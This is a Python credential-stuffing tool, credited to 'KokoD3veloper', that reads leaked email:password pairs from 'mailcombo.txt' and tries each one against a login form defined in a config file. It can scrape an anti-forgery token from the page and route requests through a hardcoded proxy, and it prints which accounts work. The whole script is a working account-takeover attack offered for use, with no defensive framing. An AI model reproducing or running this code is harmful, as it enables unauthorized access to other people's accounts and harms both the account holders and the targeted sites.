import requests 
import json
print("""

All In One By KokoD3veloper
Thanks all friends
https://github.com/KokoD3veloper
 __  ___   ______    __  ___   ______    __  .__   __.   ______   .__   __.  _______ 
|  |/  /  /  __  \  |  |/  /  /  __  \  |  | |  \ |  |  /  __  \  |  \ |  | |   ____|
|  '  /  |  |  |  | |  '  /  |  |  |  | |  | |   \|  | |  |  |  | |   \|  | |  |__   
|    <   |  |  |  | |    <   |  |  |  | |  | |  . `  | |  |  |  | |  . `  | |   __|  
|  .  \  |  `--'  | |  .  \  |  `--'  | |  | |  |\   | |  `--'  | |  |\   | |  |____ 
|__|\__\  \______/  |__|\__\  \______/  |__| |__| \__|  \______/  |__| \__| |_______|
                                                                                     """)
def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""
config = input("Config Name: (With .txt ) ")
proxy = input("Proxy Yes / No : ")
f = open("configs/" + config, encoding='utf8')
mydata = f.read()
koko = mydata.split(" --")
print(koko[0]) 
postdata = koko[1]
data2 = koko[2]
url = koko[0]
successkey = koko[3]
failkey = koko[4]
token = koko[5]
a = open("mailcombo.txt", "r").readlines()
file = [s.rstrip()for s in a]
for lines in file:
    p = requests.get("http://pubproxy.com/api/proxy?limit=1&format=txt&type=https")
    proxies = {
    "http": "89.187.177.92:80"
        }
    combo = lines.split(":")
    email = combo[0]
    sifre = combo[1]
    myobj = {
    postdata : email,
    data2 : sifre
    }
    if token == "Yes" or token == "Yes":
        tokenurl = koko[6]
        tokendata = koko[7]
        tokendata2 = koko[8]
        pastetokendata = koko[9]
        geturl = requests.get(tokenurl)
        token213 = find_between(geturl.text, tokendata, tokendata2)
        print("Token = Yes")
        myobj = {
        pastetokendata : token213,
        postdata : email,
        data2 : sifre
        }
    else:
        print("Token = No")
    if proxy == "Yes" or proxy == "yes":
        print(failkey)
        x = requests.post(url, data = myobj, proxies= proxies)
    else:
        x = requests.post(url, data = myobj)
    if successkey in x.text:
        print("Work Account ----------> " + email + ":" + sifre)
    elif failkey in x.text:
        print("Not Work Account ------>" + email + ":" + sifre)
    else:
        print ("Error Account -------->"  + email + ":" + sifre + x.text)